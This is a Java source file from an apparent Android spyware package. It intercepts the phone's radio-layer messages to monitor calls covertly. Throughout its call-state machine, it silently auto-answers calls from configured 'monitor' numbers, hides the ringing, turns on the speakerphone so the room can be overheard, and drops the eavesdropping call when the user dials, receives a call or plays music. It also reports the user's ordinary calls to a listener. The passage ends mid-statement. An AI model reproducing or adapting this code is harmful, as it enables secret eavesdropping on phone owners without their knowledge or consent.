package com.vvt.callmanager.filter;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

import android.content.Context;
import android.media.AudioManager;
import android.os.Build;
import android.os.Parcel;

import com.vvt.callmanager.CallMgrPreference;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.mitm.CallIntercept;
import com.vvt.callmanager.mitm.MitmHelper;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.MonitorDisconnectReason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.std.AudioModeMonitoring;
import com.vvt.callmanager.std.AudioModeMonitoring.OnAudioModeUpdateListener;
import com.vvt.callmanager.std.CallInfo;
import com.vvt.callmanager.std.MusicPlayMonitoring;
import com.vvt.callmanager.std.MusicPlayMonitoring.OnMusicPlayListener;
import com.vvt.callmanager.std.Response;
import com.vvt.callmanager.std.RilConstant;
import com.vvt.callmanager.std.RilManager;
import com.vvt.logger.FxLog;

class FilterGsmCall extends InterceptingFilter 
		implements CallIntercept, OnAudioModeUpdateListener {
	
	private static final String TAG = FilterFactory.TAG_FILTER_CALL;
	private static final boolean LOGV = Customization.VERBOSE;
	
    private AudioManager mAudioManager;
    private CallIntercept.Listener mInterceptListener;
    private CallMgrPreference mPreference;
    private Context mContext;
    private RilManager mRilManager;
    private AudioModeMonitoring mAudioModeListener;
	
	/**
	 * Don't set this value directly, set it via {@link #setState(CallState)}
	 */
	private CallState mState;
	
	public FilterGsmCall(Context context, Mitm mitm, RilManager rilManager) {
		super(mitm);
		mContext = context;
		mRilManager = rilManager;
		mPreference = CallMgrPreference.getInstance();
		mAudioManager = (AudioManager) mContext.getSystemService(Context.AUDIO_SERVICE);
		mAudioModeListener = new AudioModeMonitoring(mAudioManager, this);
		
		mInterceptListener = null;
		
		// Add reference to this object to all state enumerator.
		for (CallState callState : CallState.values()) {
			callState.setMessageFilter(this);
		}
		
		// Set beginning state
		setState(CallState.IDLE);
	}
	
	private void startAudioModeListener() {
		mAudioModeListener = new AudioModeMonitoring(mAudioManager, this);
		mAudioModeListener.start();
	}
	
	private void stopAudioModeListener() {
		if (mAudioModeListener != null) {
			mAudioModeListener.end();
			mAudioModeListener = null;
		}
	}
	
	@Override
	public void setInterceptListener(Listener listener) {
		mInterceptListener = listener;
	}

	@Override
	public void resetInterceptListener() {
		mInterceptListener = null;
	}

	@Override
	public void processRilRequest(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_MSG_O2M, MitmHelper.getDisplayString(p), mState));
		setState(mState.processRilRequest(p));
	}
	
	@Override
	public void processResponse(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_RESP_T2M, MitmHelper.getDisplayString(p), mState));
		setState(mState.processResponse(p));
	}
	
	@Override
	protected void writeToOriginate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_RESP_M2O, MitmHelper.getDisplayString(p), mState));
		super.writeToOriginate(p);
	}

	@Override
	protected void writeToTerminate(Parcel p) {
		writeAtMessage(String.format("%s: \"%s\" -- %s", 
				PREFIX_MSG_M2T, MitmHelper.getDisplayString(p), mState));
		super.writeToTerminate(p);
	}

	private void setState(CallState state) {
		if (state != mState) {
			String message = String.format("setState # %s -> %s", mState, state);
			writeAtMessage(message);
			
			Object transitionObject = null;
			if (mState != null) {
				transitionObject = mState.onExit();
			}
			mState = state;
			state.onEnter(transitionObject);
		}
	}

	/**
	 * Parcel sending to this method must be confirmed that it it the response of get current calls.
	 * @param currentState
	 * @param p
	 * @return
	 */
	private CallState verifyCallState(CallState currentState, Parcel p) {
		writeAtMessage("verifyCallState # ENTER ...");
		writeAtMessage(String.format("verifyCallState # Current state: %s", currentState));
		
		CallState nextState = currentState;
		
		ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
		FilterHelper.printCallInfo(calls, mRilManager.getAtLogCollector());
		
		if (calls.size() == 0) {
			nextState = CallState.IDLE;
		}
		else {
			boolean allConnected = true;
			for (CallInfo call : calls) {
				if (call.getState() > 1) {
					allConnected = false;
					break;
				}
			}
			if (allConnected) {
				nextState = CallState.OFFHOOK;
			}
		}
		
		// Make sure that the speaker will ring
		if (currentState == CallState.RINGING && 
				calls.size() == 1 && calls.get(0).getState() == 5) {
			p.setDataPosition(20);
			p.writeInt(4);
		}
		
		writeAtMessage(String.format("verifyCallState # Next state: %s", nextState));
		
		writeToOriginate(p);
		
		writeAtMessage("verifyCallState # EXIT ...");
		
		return nextState;
	}
	
	private boolean isIncomingCall(Parcel unsol, int responseCode) {
		if (responseCode == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
			unsol.setDataPosition(12);
			
			unsol.readInt(); // Constant 2
			unsol.readInt(); // Call ID
			int state = unsol.readInt(); // Call state
			
			unsol.setDataPosition(0);
			return state == 4 || state == 5;
		}
		else {
			return responseCode == RilConstant.RIL_UNSOL_CALL_RING ||
				responseCode == RilConstant.RIL_UNSOL_HTC_CALL_RING;
		}
	}
	
	private CallInfo findWaitingCall(ArrayList<CallInfo> callList) {
		for (CallInfo call : callList) {
			if (call.getState() == 5 || call.getState() == 4) {
				return call;
			}
		}
		return null;
	}
	
	private CallInfo findMonitor(ArrayList<CallInfo> callList) {
		CallInfo call = null;
		for (int i = callList.size(); i > 0; i--) {
			call = callList.get(i-1);
			if (call != null && mPreference.isMonitorNumber(call.getNumber())) {
				return call;
			}
		}
		return null;
	}
	
	private boolean isLgInfoAllCollected(
			ArrayList<CallInfo> callList, ArrayList<byte[]> lgStateInfo) {
		
		if (LOGV) FxLog.v(TAG, "isLgInfoAllCollected # ENTER ...");
		
		boolean isDone = true;
		
		if (! lgStateInfo.isEmpty()) {
			int count = 0;
			boolean foundChange = false;
			boolean isStable = true;
			
			Parcel p = null;
			Response r = null;
			for (byte[] b : lgStateInfo) {
				p = FilterHelper.getParcel(b);
				r = Response.obtain(p);
				if (r.type == 1 && r.number == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
					p.setDataPosition(16);
					int id = p.readInt();
					int state = p.readInt();
					
					if (LOGV) FxLog.v(TAG, String.format("id=%d, state=%d", id, state));
					
					// Look for stable state [0,6]
					if (state > -1 && state < 7) {
						isStable = true;
						count++;
						
						for (CallInfo call : callList) {
							if (call.getIndex() == id) {
								if (LOGV) FxLog.v(TAG, String.format(
										"id=%d, previous state=%d", 
										call.getIndex(), call.getState()));
								
								if (!foundChange) {
									foundChange = call.getState() != state;
									if (foundChange) {
										if (LOGV) FxLog.v(TAG, "Found state changed!!");
									}
								}
								break;
							}
						}
					}
					else {
						isStable = false;
						if (LOGV) FxLog.v(TAG, "State not stable, continue waiting ...");
					}
				}
			}
			if (LOGV) FxLog.v(TAG, String.format(
					"call list: %d, count: %d, foundChange: %s", 
					callList.size(), count, foundChange));
			
			if (! isStable) {
				if (LOGV) FxLog.v(TAG, "Result: State not stable!! -> Wait ...");
				isDone = false;
			}
			else if (count == callList.size() && foundChange) {
				if (LOGV) FxLog.v(TAG, "Result: Found changed in call state! -> Done");
				isDone = true;
			}
			else if (count > callList.size()) {
				if (LOGV) FxLog.v(TAG, "Result: Found changed in number of calls! -> Done");
				isDone = true;
			}
			else {
				if (count < callList.size()) {
					if (LOGV) FxLog.v(TAG, "Result: Lacking information!! -> Wait ...");
				}
				isDone = false;
			}
		}
		
		if (LOGV) FxLog.v(TAG, "isLgInfoAllCollected # EXIT ...");
		
		return isDone;
	}
	
	private void forwardLgStateInfo(ArrayList<byte[]> lgStateInfo) {
		for (byte[] lgParcel : lgStateInfo) {
			writeToOriginate(
					FilterHelper.getParcel(lgParcel));
		}
		lgStateInfo.clear();
	}
	
	private void writeAtMessage(String message) {
		mRilManager.writeAtMessage(message);
	}
	
	private void notifyMonitorDisconnect(MonitorDisconnectReason reason) {
		if (mInterceptListener != null) {
			mInterceptListener.onMonitorDisconnect(reason);
		}
	}
	
	public enum CallState {
		
		IDLE {
			
			private CallInfo monitorCallInfo;
			private byte[] cacheUnsolCallRing;
			private boolean isWaitingForResponse;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"IDLE # ENTER ...");
				
				monitorCallInfo = null;
				cacheUnsolCallRing = null;
				isWaitingForResponse = false;
				
				// Manage call list for notification
				if (sNotifiedList == null) {
					sNotifiedList = new HashSet<String>();
				}
				else {
					sNotifiedList.clear();
				}
				
				mFilterCall.startAudioModeListener();
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"IDLE # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return monitorCallInfo;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				if (request == RilConstant.RIL_REQUEST_DIAL) {
					mFilterCall.writeAtMessage("Target is dialing");
					nextState = DIALING;
				}
				
				mFilterCall.writeToTerminate(p);
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				// Screen every incoming call
				if (mFilterCall.isIncomingCall(p, response)) {
					mFilterCall.writeAtMessage(
							"Got incoming call -> Ask for the phone number");
					cacheUnsolCallRing = p.marshall();
					forward = false;
				}
				
				else if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					FilterHelper.requestGetCurrentCalls(mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				
				else if (isWaitingForResponse && FilterHelper.isHangup(response)) {
					isWaitingForResponse = false;
					forward = false;
					nextState = IDLE;
				}
				
				else if (isWaitingForResponse && response == RilConstant.RIL_REQUEST_ANSWER) {
					isWaitingForResponse = false;
					forward = false;
					nextState = SPYING;
				}
				
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					CallInfo call = null;
					if (calls != null && calls.size() == 1) {
						call = calls.get(0);
					}
					
					if (call != null && call.getState() == 4) {
						mFilterCall.writeAtMessage(
								String.format("Get calling from: %s", call.getNumber()));
						
						nextState = handleIncomingCall(call);
					}
				}
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			private CallState handleIncomingCall(CallInfo call) {
				MonitorNumber monitorInfo = 
						mFilterCall.mPreference.getMonitorInfo(call.getNumber());
				
				boolean isEnabledMonitorFound = monitorInfo != null && monitorInfo.isEnabled();
				
				// To Answer or Reject
				if (isEnabledMonitorFound) {
					mFilterCall.writeAtMessage("Found active monitor!");
					
					boolean isMusicPlaying = mFilterCall.mAudioManager.isMusicActive();
					boolean isSpyEnabled = monitorInfo.isSpyEnabled();
					boolean isGreenLight = isSpyEnabled && !isMusicPlaying;
					
					// Answer a call from a monitor
					if (isGreenLight) {
						mFilterCall.writeAtMessage("Answer automatically");
						monitorCallInfo = call;
						
						Parcel answer = FilterHelper.getParcel(
								FilterHelper.REQUEST_ANSWER);
						
						mFilterCall.mRilManager.addRequest(answer);
						mFilterCall.writeToTerminate(answer);
						
						isWaitingForResponse = true;
					}
					// Reject call from a monitor
					else {
						mFilterCall.writeAtMessage(String.format("%s -> Reject Spy Call", 
								isMusicPlaying ? "Music is playing" : "Spy Call is disabled"));
						
						// Normal: 'Hangup' or 'Hangup Background' also works.
						// Atrix: require 'Hangup Background'
						// LG: require 'LG Hangup'
						byte[] bytes = Build.MODEL != null && Build.MODEL.contains("LG") ? 
								FilterHelper.REQUEST_HANGUP_LG : 
									FilterHelper.REQUEST_HANGUP_BACKGROUND;
						
						Parcel hangup = FilterHelper.getParcel(bytes);
						mFilterCall.mRilManager.addRequest(hangup);
						mFilterCall.writeToTerminate(hangup);

						if (isMusicPlaying) {
							mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.MUSIC_PLAY);
						}
						isWaitingForResponse = true;
					}
					
					return IDLE;
				}
				// To let the phone ring
				else {
					mFilterCall.writeAtMessage("Forward ringing message");
					FilterHelper.forwardRingMessages(mFilterCall, cacheUnsolCallRing);
					return RINGING;
				}
			}
			
		}, 
		
		DIALING {
			
			private Object transition;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"DIALING # ENTER ...");
				
				// This logic seems nonsense but it helps solving voice issue
				// occurred in HTC Sensation and Motorola Atrix from these 2 scenarios:-
				// 1. SPYING > RINGING > OFFHOOK (Sensation) 
				// 2. SPYING > DIALING > OFFHOOK (Atrix)
				// without this code the sound will be unable to hear in OFFHOOK state
				mFilterCall.mAudioManager.setMode(AudioManager.MODE_NORMAL);
				mFilterCall.mAudioManager.setMode(AudioManager.MODE_IN_CALL);
				
				mFilterCall.startAudioModeListener();
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"DIALING # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				// To collect serial of request get current calls
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					nextState = mFilterCall.verifyCallState(this, p);
					if (nextState == OFFHOOK) {
						transition = p;
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
		}, 
		
		RINGING {
			
			private Object transition;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"RINGING # ENTER ...");
				mFilterCall.startAudioModeListener();
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"RINGING # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				// To collect serial of request get current calls
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					Response r = Response.obtain(p);
					forward = r.number != FilterHelper.SERIAL_CLCC;
					
					nextState = mFilterCall.verifyCallState(this, p);
					if (nextState == OFFHOOK) {
						transition = p;
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
		}, 
		
		SPYING {
			
			private byte[] cacheRequestMute;
			private byte[] cacheRequestDial;
			private byte[] cacheUnsolCallRing;
			private boolean isWaitingForHangupResponse;
			private int monitorIndex;
			
			private MusicPlayMonitoring musicMonitoring;
			private OnMusicPlayListener musicPlayListener;
			@SuppressWarnings("unused")
			private CallState exitState; // for selecting audio mode when exit
			
			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"SPYING # ENTER ...");
				
				mFilterCall.startAudioModeListener();
				
				if (transitionObject != null && 
						transitionObject instanceof CallInfo) {
					
					CallInfo monitor = (CallInfo) transitionObject;
					monitorIndex = monitor.getIndex();
					
					mFilterCall.writeAtMessage(String.format("Monitor Index: %d", monitorIndex));
				}
				
				cacheRequestMute = null;
				cacheRequestDial = null;
				cacheUnsolCallRing = null;
				isWaitingForHangupResponse = false;
				exitState = null;
				monitorIndex = monitorIndex > 0 ? monitorIndex : 1;
				
				registerMusicPlayListener();
				mFilterCall.writeAtMessage("Music play listener is registered");
				
				mFilterCall.mAudioManager.setSpeakerphoneOn(true);
				mFilterCall.writeAtMessage("Speaker is ON");
				
				// Noise Canceling system will be disabled automatically, if loud speaker is enabled
				// if (!turnOffSpeaker) mAudioManager.setParameters("noise_suppression=off");
			}
			
			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"SPYING # EXIT ...");
				
				unregisterMusicPlayListener();
				mFilterCall.writeAtMessage("Music play listener is unregistered");
				
				// This logic need to be here
				// It shouldn't be too fast, otherwise it won't be any useful on Sensation
				mFilterCall.mAudioManager.setSpeakerphoneOn(false);
				mFilterCall.writeAtMessage("Speaker is OFF");
				
				mFilterCall.stopAudioModeListener();
				
				return null;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int request = mFilterCall.mRilManager.getRequest(p);
				
				if (request == RilConstant.RIL_REQUEST_SET_MUTE) {
					if (cacheRequestMute == null) {
						cacheRequestMute = p.marshall();
					}
					forward = false;
				}
				if (request == RilConstant.RIL_REQUEST_DIAL) {
					mFilterCall.writeAtMessage("Target is making call -> Release monitor");
					cacheRequestDial = p.marshall();
					
					Parcel hangup = FilterHelper.getParcel(
							FilterHelper.REQUEST_HANGUP_FOREGROUND);
					
					mFilterCall.mRilManager.addRequest(hangup);
					mFilterCall.writeToTerminate(hangup);
					
					isWaitingForHangupResponse = true;
					forward = false;
					
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.DIALING);
				}
				
				if (forward) {
					mFilterCall.writeToTerminate(p);
				}
				
				exitState = nextState;
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					mFilterCall.writeAtMessage("Call state changed -> Get current calls");
					FilterHelper.requestGetCurrentCalls(mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				// Target gets GSM incoming call
				else if (mFilterCall.isIncomingCall(p, response)) {
					mFilterCall.writeAtMessage(
							"Get incoming call -> Prepare releasing monitor");
					cacheUnsolCallRing = p.marshall();
					// Still too fast for releasing the monitor
					forward = false;
				}
				// Block LG additional state info message
				else if (response == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
					forward = false;
				}
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					mFilterCall.writeAtMessage("Got current calls response");
					
					forward = false;
					
					ArrayList<CallInfo> calls = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							calls, mFilterCall.mRilManager.getAtLogCollector());
					
					CallInfo waitingCall = mFilterCall.findWaitingCall(calls);
					
					if (isWaitingForHangupResponse) {
						if (calls == null || calls.size() == 0) {
							if (cacheRequestDial != null) {
								mFilterCall.writeAtMessage(
										"Monitor is released -> Forward dialing message");
								
								if (cacheRequestMute != null) {
									mFilterCall.writeToTerminate(
											FilterHelper.getParcel(cacheRequestMute));
								}
								mFilterCall.writeToTerminate(
										FilterHelper.getParcel(cacheRequestDial));
								
								nextState = DIALING;
							}
							else {
								nextState = IDLE;
							}
						}
						else if (waitingCall != null) {
							mFilterCall.writeAtMessage(
									"Monitor is released -> Forward ringing messages");
							FilterHelper.forwardRingMessages(mFilterCall, cacheUnsolCallRing);
							
							nextState = RINGING;
						}
					}
					// Waiting call is steady, we can release monitor
					else if (waitingCall != null && calls.size() > 1) {
						mFilterCall.writeAtMessage(
								"Waiting call is steady -> Release monitor");
						releaseMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.CALL_WAITING);
					}
					// Monitor is gone
					else if (calls.size() == 0) {
						mFilterCall.writeAtMessage("Monitor is gone");
						nextState = IDLE;
					}
				}
				// Handle incoming or outgoing call
				else if (isWaitingForHangupResponse && FilterHelper.isHangup(response)) {
					mFilterCall.writeAtMessage("Got hangup response");
					forward = false;
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				
				exitState = nextState;
				return nextState;
			}
			
			private void releaseMonitor() {
				FilterHelper.hangupIndex(
						monitorIndex, mFilterCall, mFilterCall.mRilManager);
				
				// Set audio mode NORMAL here will cause an issue in HTC Sensation
				// the target can't hear any voice, when the next state is RINGING then OFFHOOK
				
				// But if the NORMAL mode is not set, it will cause another issue in Motorola Atrix
				// the target can't hear any voice, when the next state is DIALING then OFFHOOK 
				
				isWaitingForHangupResponse = true;
			}

			private void registerMusicPlayListener() {
				musicPlayListener = new OnMusicPlayListener() {
					@Override
					public void onMusicPlay() {
						mFilterCall.writeAtMessage("Music become active -> Release monitor");
						releaseMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.MUSIC_PLAY);
					}
				};
				
				musicMonitoring = new MusicPlayMonitoring(
						mFilterCall.mAudioManager, musicPlayListener);
				
				musicMonitoring.start();
			}

			private void unregisterMusicPlayListener() {
				if (musicPlayListener != null) {
					musicPlayListener = null;
				}
				
				if (musicMonitoring != null) {
					musicMonitoring.end();
					musicMonitoring = null;
				}
			}
			
		}, 
		
		OFFHOOK {
			
			private byte[] cacheUnsolCallRing;
			private ArrayList<CallInfo> callList;
			private ArrayList<byte[]> lgStateInfo;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"OFFHOOK # ENTER ...");
				
				mFilterCall.startAudioModeListener();
				
				cacheUnsolCallRing = null;
				
				if (transitionObject == null) {
					callList = new ArrayList<CallInfo>();
				}
				else {
					callList = CallInfo.getCallInfo((Parcel) transitionObject);
					FilterHelper.printCallInfo(
							callList, mFilterCall.mRilManager.getAtLogCollector());
					
					notifyOnCallConnect();
				}
				
				if (lgStateInfo == null) {
					lgStateInfo = new ArrayList<byte[]>();
				}
				lgStateInfo.clear();
				
				// Set audio mode IN_CALL here will affect HTC Sensation (2.3.3) 
				// normal conversation get mute
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"OFFHOOK # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return callList;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				
				// To collect serial of request get current calls
				int request = mFilterCall.mRilManager.getRequest(p);
				
				if (request == RilConstant.RIL_REQUEST_DIAL) {
					nextState = OFFHOOK_DIALING;
				}
				
				mFilterCall.writeToTerminate(p);
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					callList = CallInfo.getCallInfo(p);
					FilterHelper.printCallInfo(
							callList, mFilterCall.mRilManager.getAtLogCollector());
					
					if (callList.size() == 0) {
						mFilterCall.writeAtMessage("There is no active call -> Go IDLE");
						nextState = IDLE;
						forward = checkForwardingCurrentCalls(p);
					}
					else {
						CallInfo waitingCall = mFilterCall.findWaitingCall(callList);
						
						if (waitingCall == null) {
							forward = checkForwardingCurrentCalls(p);
						}
						else {
							String incomingNumber = waitingCall.getNumber();
							
							mFilterCall.writeAtMessage(String.format(
									"Get calling from: %s", incomingNumber));
							
							MonitorNumber monitorInfo = 
									mFilterCall.mPreference.getMonitorInfo(incomingNumber);
							
							// Leave the next state to make a decision whether to answer or not
							if (monitorInfo != null && monitorInfo.isEnabled()) {
								mFilterCall.writeAtMessage("Found monitor!!");
								nextState = OFFHOOK_SPYING;
							}
							// Let it ring
							else {
								if (! lgStateInfo.isEmpty()) {
									mFilterCall.forwardLgStateInfo(lgStateInfo);
								}
								else {
									FilterHelper.forwardRingMessages(mFilterCall, cacheUnsolCallRing);
								}
								nextState = OFFHOOK_RINGING;
							}
							forward = false;
						}
						
					}
				}
				else if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					if (! lgStateInfo.isEmpty()) {
						lgStateInfo.add(p.marshall());
					}
					if (lgStateInfo.isEmpty() || 
							mFilterCall.isLgInfoAllCollected(callList, lgStateInfo)) {
						FilterHelper.requestGetCurrentCalls(
								mFilterCall.mRilManager, mFilterCall);
						// lgStateInfo will be cleared after forwarding
					}
					forward = false;
				}
				// Wait for checking number before forwarding to the originate
				else if (mFilterCall.isIncomingCall(p, response)) {
					mFilterCall.writeAtMessage(
							"Found incoming call -> Wait for checking ...");
					if (! lgStateInfo.isEmpty()) {
						lgStateInfo.add(p.marshall());
					}
					else {
						cacheUnsolCallRing = p.marshall();
					}
					forward = false;
				}
				
				else if (response == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
					lgStateInfo.add(p.marshall());
					forward = false;
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			private boolean checkForwardingCurrentCalls(Parcel p) {
				Response r = Response.obtain(p);
				
				// Done with checking after call state changed
				if (r.number == FilterHelper.SERIAL_CLCC) {
					if (! lgStateInfo.isEmpty()) {
						mFilterCall.forwardLgStateInfo(lgStateInfo);
					}
					else {
						mFilterCall.writeToOriginate(
								FilterHelper.getParcel(
										FilterHelper.UNSOL_CALL_STATE_CHANGED));
					}
					return false;
				}
				// Allow forwarding the response if it was not queried by MITM
				else {
					return true;
				}
			}
			
			private void notifyOnCallConnect() {
				String number = null;
				
				ActiveCallInfo activeCall = null;
				for (CallInfo call : callList) {
					number = call.getNumber();
					boolean isMonitor = mFilterCall.mPreference.isMonitorNumber(number);
					
					if (isMonitor) continue;
					
					if (! sNotifiedList.contains(number)) {
						sNotifiedList.add(number);
						
						if (mFilterCall.mInterceptListener != null) {
							activeCall = new ActiveCallInfo();
							activeCall.setIncoming(call.getDirection() == 1);
							activeCall.setNumber(call.getNumber());
							mFilterCall.mInterceptListener.onNormalCallActive(activeCall);
						}
					}
				}
			}
			
		},
		
		OFFHOOK_DIALING {
			
			private Object transition;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_DIALING # ENTER ...");
				mFilterCall.startAudioModeListener();
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_DIALING # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				// To collect serial of request get current calls
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					nextState = mFilterCall.verifyCallState(this, p);
					if (nextState == OFFHOOK) {
						transition = p;
					}
					forward = false;
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
		}, 
		
		OFFHOOK_RINGING {
			
			private Object transition;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_RINGING # ENTER ...");
				mFilterCall.startAudioModeListener();
			}

			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_RINGING # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				// To collect serial of request get current calls
				mFilterCall.mRilManager.getRequest(p);
				mFilterCall.writeToTerminate(p);
				return this;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					nextState = mFilterCall.verifyCallState(this, p);
					if (nextState == OFFHOOK) {
						transition = p;
					}
					forward = false;
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
		},
		
		OFFHOOK_SPYING {
			
			private Object transition;
			
			private boolean targetIsDialing;
			
			private boolean isReleasingMonitor;
			private boolean isSwitching;
			private boolean isMerging;
			private boolean isStateChanged;
			private boolean isSwitchingResponded;
			private boolean isLgStateInProgress;
			
			private byte[][] cacheRequest;
			private byte[] cacheUnsol;
			
			private CallInfo monitorCallInfo;
			private ArrayList<byte[]> lgStateInfo;
			private ArrayList<CallInfo> callList;

			@Override
			public void onEnter(Object transitionObject) {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_SPYING # ENTER ...");
				
				mFilterCall.startAudioModeListener();
				
				targetIsDialing = false;
				
				isReleasingMonitor = false;
				isSwitching = false;
				isMerging = false;
				isStateChanged = false;
				isSwitchingResponded = false;
				isLgStateInProgress = false;
				
				cacheRequest = new byte[3][];
				cacheUnsol = null;
				
				monitorCallInfo = null;
				callList = null;
				
				if (lgStateInfo == null) {
					lgStateInfo = new ArrayList<byte[]>();
				}
				lgStateInfo.clear();
				
				initialize(transitionObject);
			}
			
			@Override
			public Object onExit() {
				if (LOGV) FxLog.v(TAG,"OFFHOOK_SPYING # EXIT ...");
				mFilterCall.stopAudioModeListener();
				return transition;
			}

			@Override
			public CallState processRilRequest(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				// To collect serial of request get current calls
				int request = mFilterCall.mRilManager.getRequest(p);
				
				// Target hang up or releasing foreground calls
				if (FilterHelper.isHangup(request)) {
					mFilterCall.writeAtMessage("Target is hanging up -> Release monitor");
					cacheRequest[0] = p.marshall();
					releaseMonitor();
					forward = false;
					
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.HANGUP);
				}
				else if (request == RilConstant.RIL_REQUEST_SWITCH_CALLS) {
					mFilterCall.writeAtMessage("Target is switching calls -> Release monitor");
					cacheRequest[0] = p.marshall();
					releaseMonitor();
					forward = false;
					
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.SWITCH_CALL);
				}
				else if (request == RilConstant.RIL_REQUEST_SET_MUTE) {
					if (cacheRequest[0] != null) {
						byte[] bytes = cacheRequest[0];
						boolean isSetMute = 
								bytes.length > 4 && 
